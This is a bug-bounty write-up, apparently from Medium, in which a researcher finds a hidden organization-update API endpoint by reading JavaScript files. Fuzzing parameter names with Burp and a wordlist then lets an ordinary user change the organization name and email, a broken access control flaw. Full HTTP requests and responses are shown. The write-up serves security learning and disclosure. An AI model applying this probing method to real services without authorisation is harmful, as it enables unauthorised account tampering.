---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-02-23_how-i-used-js-files-inspection-and-fuzzing-to-do-adminssupports-stuff.md
original_filename: 2023-02-23_how-i-used-js-files-inspection-and-fuzzing-to-do-adminssupports-stuff.md
title: How I Used JS files inspection and Fuzzing to do admins/supports stuff
category: documents
detected_topics:
- access-control
- api-security
- command-injection
- otp
tags:
- imported
- documents
- access-control
- api-security
- command-injection
- otp
language: en
raw_sha256: 50f3a067efc00246e47c80a2d22b4c842f605feda80ea170f337cabaa1c25aea
text_sha256: 4d347fb2e73c05b7842606fc1cdfa63638269532fa28f9da021572b083c9644c
ingested_at: '2026-06-28T07:32:18Z'
sensitivity: unknown
redactions_applied: false
---

# How I Used JS files inspection and Fuzzing to do admins/supports stuff

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-02-23_how-i-used-js-files-inspection-and-fuzzing-to-do-adminssupports-stuff.md
- Source Type: markdown
- Detected Topics: access-control, api-security, command-injection, otp
- Ingested At: 2026-06-28T07:32:18Z
- Redactions Applied: False
- Raw SHA256: `50f3a067efc00246e47c80a2d22b4c842f605feda80ea170f337cabaa1c25aea`
- Text SHA256: `4d347fb2e73c05b7842606fc1cdfa63638269532fa28f9da021572b083c9644c`


## Content

---
title: "How I Used JS files inspection and Fuzzing to do admins/supports stuff"
url: "https://medium.com/@bag0zathev2/how-i-used-js-files-inspection-and-fuzzing-to-do-admins-supports-stuff-dd4f700605a"
authors: ["Fares Walid (@SirBagoza)"]
bugs: ["Broken Access Control"]
publication_date: "2023-02-23"
added_date: "2023-03-02"
source: "pentester.land/writeups.json"
original_index: 1482
scraped_via: "browseros"
---

# How I Used JS files inspection and Fuzzing to do admins/supports stuff

How I Used JS files inspection and Fuzzing to do admins/supports stuff
Fares Walid (SirBugs)
Follow
5 min read
·
Feb 23, 2023

815

4

Press enter or click to view image in full size

Hi boyzzzzz, How are you! I missed u really ❤
I found a new bug today that allowed me to do a support activity, Since I am not permitted to disclose this bug .. We are gonna call this hacked website target.com

This bug was found out by inspecting the JS files in the source code and then I used fuzzing technique for getting the params and complete the request!
Remember, You always have to check the Js file, specially if the site is using an API endpoints !!

Let’s start now ..

In the mentioned website, You could create a projects inside your organization, But the organization name and email are not able to get changed!! If you wanna change them, So you have to contact the admin or support !!

Press enter or click to view image in full size

First of all while inspecting the Js files, There were a lot of files, But a specific file got my looks, cuz it had more than a request for the endpoints that the website is using!
The website is using API system on: https://target.com/endpoints/organization/<ACTION>

One of those interesting endpoints I found in the mentioned JS file was: /endpoints/organization/update

saveOrganization: async a => _({
  method: "PUT",
  endpoint: "/endpoints/organization/update",
  body: a
  }).then(r => n(r)),

I wanted to know seriously what is this endpoint doing ..

So, Quickly I started sending a PUT request to https://target.com/endpoints/organization/update with no data, like:

PUT /endpoints/organization/update HTTP/2
Host: home.target.com
Cookie: XXXXXXXXXXXXXXXXXXXXXXXXXXXXX
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0
Accept: application/json
Referer: <https://home.target.com/>
Content-Type: application/json
Content-Length: 76
Origin: <https://home.target.com/>

The Response was expected, Since no data is sent and It’s PUT one!

HTTP/2 500 Internal Server Error

{"error": {"code": "500", "message": "A server error has occurred"}}
Press enter or click to view image in full size

Egyptian Meme saying “So you don’t wanna get hacked?”

So I Decided To start sending any random data, like: {"hello":"goodbye"} and it was like:

PUT /endpoints/organization/update HTTP/2
Host: home.target.com
Cookie: XXXXXXXXXXXXXXXXXXXXXXXXXXXXX
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0
Accept: application/json
Referer: https://home.target.com/
Content-Type: application/json
Content-Length: 76
Origin: https://home.target.com/

{"hello":"goodbye"}
HTTP/2 500 Internal Server Error]

{"message":"Error: This user does not have admin access!","type":"error"}

So, I’ve been hunting on this website for nearly 4 5 days, I know exactly what are the parameters that could have that session/token !!

Get Fares Walid (SirBugs)’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

This token we are talking about is necessary and used through all the requests of the API endpoints, Each account has a specific token, but each endpoint is calling that token with a different name, like one is calling it code, other token session tokenId session_id access org_id id org user

I am using a burp extension too, It’s called Param Miner , It’s collecting all the parameters from the requests in the burp history for specific target! That was helpful for extracting those param names clearly !!
So I got a token from a random request, and started sending it with all of those param names one by one ..

Boom!! finally!!! session_id with submitting my own token!! worked fine!

PUT /endpoints/organization/update HTTP/2
Host: home.target.com
Cookie: XXXXXXXXXXXXXXXXXXXXXXXXXXXXX
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0
Accept: application/json
Referer: https://home.target.com/
Content-Type: application/json
Content-Length: 76
Origin: https://home.target.com/

{"session_id":"9n5n6zxxxxxxxxxllye4ul"}
HTTP/2 400 Bad Request
{"message":"No data to update"}

So now my session is validated successfully !! and the server is replying with “No data to update”
That means that it’s waiting for me to submit a value to change!!
Now It’s time to fuzz for those params of things I can change ..
Clearly, I Used: https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/burp-parameter-names.txt for this process.

Sent my request to intruder in burp, Pasted my list, Sent a data like {"session_id":"9n5n6zdxxxxxxxx05llye4ul", "$myrandomparam$":"changevalueeeee"}

By 3/4 minutes after I started the fuzzing process, I noticed a different status code, response length
I had to check it! and here I found the request that allows me to change my organization name/email !! Which is not allowed !! This action is only should be done by admin/support !!

PUT /endpoints/organization/update HTTP/2
Host: home.target.com
Cookie: XXXXXXXXXXXXXXXXXXXXXXXXXXXXX
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0
Accept: application/json
Referer: https://home.target.com/
Content-Type: application/json
Content-Length: 76
Origin: https://home.target.com/

{"session_id":"9n5n6xxxxxxxxxxc05llye4ul", "name":"changevalueeeee"}
HTTP/2 200 OK
{"billing_enabled":false,"billing_type":"trial","created_at":1676997471,"data_streams_plan":"starter","email_address":"xxxxxxxxxxx@xxxxxxxx.xxx","feature_flag":{"allow_usage_billing":false,"forever_free_tier":false},"first_non_auth_api_call_made":null,"id":"2lxxxxxxxxxxzf49rtjd8ia","invoices":null,"is_marketplace_org":false,"marketplace_id":null,"name":"changevalueeeee","stripe_customer_id":null,"trial_end_date":1678207071}

I said in my head, I see in the response "email_address":"xxxxxxxxxxx@xxxxxxxx.xxx", That's my organization email address That I am not able to change !!
I tried to send it in the post data and set a new one, So i sent email_address withsession_id and name, Then I got:

Press enter or click to view image in full size

It’s hacked and name/email changed successfully with all love ❤

Press enter or click to view image in full size

Thank you all for reading and for your time ❤ I wish you had some fun with me and liked this write-up inshallah ❤

as soon as I get smth interesting to write about it, I am gonna share it :D

Have fun and keep digging ❤

My Twitter ❤

My Github ❤
